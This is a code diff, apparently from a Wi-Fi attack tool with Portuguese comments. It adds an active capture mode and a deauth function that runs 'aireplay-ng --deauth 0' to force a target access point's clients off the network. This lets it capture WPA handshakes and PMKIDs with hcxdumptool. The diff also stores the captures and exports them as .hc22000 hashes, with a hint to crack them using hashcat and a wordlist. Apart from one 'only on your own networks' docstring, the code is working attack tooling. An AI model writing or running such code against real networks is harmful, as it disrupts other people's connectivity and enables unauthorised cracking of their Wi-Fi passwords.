@@ -23,8 +23,18 @@ try:
 except OSError:
     DATA = WORK
     STORE = f"{DATA}/networks.json"
+CAPTURES = f"{DATA}/captures"
+try:
+    os.makedirs(CAPTURES, exist_ok=True)
+except OSError:
+    CAPTURES = WORK
 
-_capture = {"proc": None, "started": 0, "targets": [], "iface": None}
+_capture = {"proc": None, "started": 0, "targets": [], "iface": None,
+            "essid": None, "mode": "ativo"}
+
+
+def _slug(s):
+    return re.sub(r"[^A-Za-z0-9_-]", "_", (s or "rede"))[:40]
 
 
 def _sh(cmd, timeout=20):
@@ -257,7 +267,9 @@ def _which(prog):
                           capture_output=True).returncode == 0
 
 
-def capture_start(bssids, channels, iface=None):
+def capture_start(bssids, channels, iface=None, mode="ativo", essid=None):
+    """mode: 'ativo' = derruba clientes (deauth) e captura handshake+PMKID;
+             'passivo' = so escuta, sem enviar nada."""
     iface = _pick(iface)
     if not _radio_present(iface):
         return {"ok": False, "error": f"interface {iface} ausente."}
@@ -277,17 +289,76 @@ def capture_start(bssids, channels, iface=None):
         os.remove(cap)
     except OSError:
         pass
-    # hcxdumptool seta o monitor sozinho; garantimos managed antes
     _set_managed(iface)
+    cmd = ["hcxdumptool", "-i", iface, "-w", cap, f"--bpf={bpf}", "-c", chans, "--rds=1"]
+    if mode == "passivo":
+        # nao envia deauth/disassoc (so escuta)
+        cmd += ["--disable_deauthentication", "--disable_disassociation"]
     proc = subprocess.Popen(
-        ["hcxdumptool", "-i", iface, "-w", cap, f"--bpf={bpf}",
-         "-c", chans, "--rds=1"],
-        stdout=open(f"{WORK}/hcx.log", "w"),
-        stderr=subprocess.STDOUT,
-        preexec_fn=os.setsid,
+        cmd, stdout=open(f"{WORK}/hcx.log", "w"),
+        stderr=subprocess.STDOUT, preexec_fn=os.setsid,
     )
-    _capture.update({"proc": proc, "started": time.time(), "targets": bssids, "iface": iface})
-    return {"ok": True, "msg": "captura iniciada", "iface": iface, "alvos": bssids, "canais": chans}
+    _capture.update({"proc": proc, "started": time.time(), "targets": bssids,
+                     "iface": iface, "essid": essid, "mode": mode})
+    return {"ok": True, "msg": "captura iniciada", "iface": iface, "modo": mode,
+            "alvos": bssids, "canais": chans}
+
+
+def deauth(bssid, channel, iface=None, seconds=10):
+    """Derruba os clientes de um AP (forca reconexao). So em redes suas."""
+    iface = _pick(iface)
+    if not _radio_present(iface):
+        return {"ok": False, "error": f"interface {iface} ausente."}
+    if _capture["proc"] and _capture["proc"].poll() is None:
+        return {"ok": False, "error": "pare a captura antes (mesma placa)"}
+    _set_monitor(iface)
+    try:
+        if channel:
+            _sh(f"iw dev {iface} set channel {channel}", timeout=8)
+        r = _sh(f"timeout {seconds} aireplay-ng --deauth 0 -a {bssid} {iface}",
+                timeout=seconds + 8)
+    finally:
+        _set_managed(iface)
+    sent = r.stdout.count("Sending") + r.stdout.count("DeAuth")
+    return {"ok": True, "bssid": bssid, "pacotes": sent, "saida": r.stdout[-400:]}
+
+
+# ---------------- arquivos salvos ----------------
+def _persist(src, label):
+    """Copia um arquivo de captura/hash para a pasta persistente."""
+    if not os.path.exists(src) or os.path.getsize(src) == 0:
+        return None
+    ext = os.path.splitext(src)[1]
+    name = f"{_slug(label)}_{int(time.time())}{ext}"
+    dst = f"{CAPTURES}/{name}"
+    try:
+        import shutil
+        shutil.copy(src, dst)
+        return name
+    except Exception:
+        return None
+
+
+def list_files():
+    out = []
+    for p in sorted(glob.glob(f"{CAPTURES}/*")):
+        try:
+            st = os.stat(p)
+            out.append({"nome": os.path.basename(p), "bytes": st.st_size,
+                        "ts": int(st.st_mtime),
+                        "tipo": "handshake" if p.endswith(".hc22000") else
+                                "captura" if p.endswith(".pcapng") else "arquivo"})
+        except OSError:
+            pass
+    out.sort(key=lambda x: x["ts"], reverse=True)
+    return {"ok": True, "files": out, "pasta": CAPTURES}
+
+
+def delete_file(name):
+    p = f"{CAPTURES}/{os.path.basename(name or '')}"
+    if os.path.exists(p):
+        os.remove(p)
+    return {"ok": True}
 
 
 def capture_status():
@@ -348,9 +419,13 @@ def export_hc22000():
         return {"ok": False, "error": "nenhum handshake valido pra exportar"}
     with open(out) as f:
         content = f.read()
+    label = _capture.get("essid") or "rede"
+    saved_hash = _persist(out, label)       # guarda o .hc22000
+    _persist(cap, label)                    # guarda o .pcapng bruto
     return {
         "ok": True,
         "arquivo": "nullgate.hc22000",
+        "salvo_como": saved_hash,
         "linhas": content.count("\n"),
         "conteudo": content,
         "dica": "rode na GPU: hashcat -m 22000 nullgate.hc22000 wordlist.txt",
